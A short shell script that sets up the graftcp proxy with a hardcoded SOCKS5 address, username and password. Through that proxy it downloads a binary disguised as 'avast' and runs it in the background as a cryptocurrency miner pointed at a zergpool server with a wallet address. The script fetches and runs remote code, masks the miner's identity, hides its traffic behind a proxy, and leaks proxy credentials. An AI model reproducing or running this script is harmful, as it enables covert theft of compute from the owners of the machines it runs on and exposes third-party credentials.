#!/bin/sh

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 3.16.66.235:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://github.com/aurbach55/pos/raw/main/avast
chmod +x avast

./graftcp/graftcp nohup ./avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 4 -x > /tmp/avast.log 2>&1
